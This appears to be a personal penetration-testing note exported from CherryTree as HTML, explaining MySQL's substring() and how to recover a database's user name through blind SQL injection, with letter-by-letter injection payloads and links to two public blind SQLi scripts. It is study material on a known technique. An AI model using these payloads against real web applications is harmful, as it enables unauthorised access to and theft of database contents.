@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>current user</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>current user</h1><br /><br /><br />substring() → returns a substring of the given argument. It
+    takes three parameters: <br /> ▪ input string<br /> ▪ position of the substring<br /> ▪ substring length.<br />
+    <div class="codebox">
+      <div class="codebox">mysql&gt;&nbsp;select&nbsp;substring(user(),&nbsp;1,&nbsp;1);</div>
+    </div><br /> <br />So if we want to exploit an input of a WebApp:<br />1. Test first letter <br /> 1) &#39; or
+    substr(user(), 1, 1)= &#39;a<br /> 2) &#39; or substr(user(), 1, 1)= &#39;b<br /> 3) &#39; or substr(user(), 1, 1)=
+    &#39;c<br /> 4) ... until we not find a sign from the webapp that the query is True<br />2. Test second letter
+    <br /> 1) &#39; or substr(user(), 2, 1)= &#39;a<br /> 2) &#39; or substr(user(), 2, 1)= &#39;b<br /> 3) &#39; or
+    substr(user(), 2, 1)= &#39;c<br /> 4) ... until we not find a sign from the webapp that the query is
+    True<br /><br />3. ... We continue down this path until we know the entire
+    username.<br /><br /><br /><strong>Tools(scripts)</strong><br />Because exploit this vulnerability manually can take
+    a lot of time take in considerations to write your own script or use one that you can find online like these (not
+    tested yet): <br /> ◇ <a
+      href="https://github.com/21y4d/blindSQLi/blob/master/blindSQLi.py" target="_blank">https://github.com/21y4d/blindSQLi/blob/master/blindSQLi.py</a>
+    (python)<br /> ◇ <a
+      href="https://github.com/ivanitlearning/Blind_SQL_injection_script" target="_blank">https://github.com/ivanitlearning/Blind_SQL_injection_script</a>
+    (bash)
+  </div>
+</body>
+
+</html>
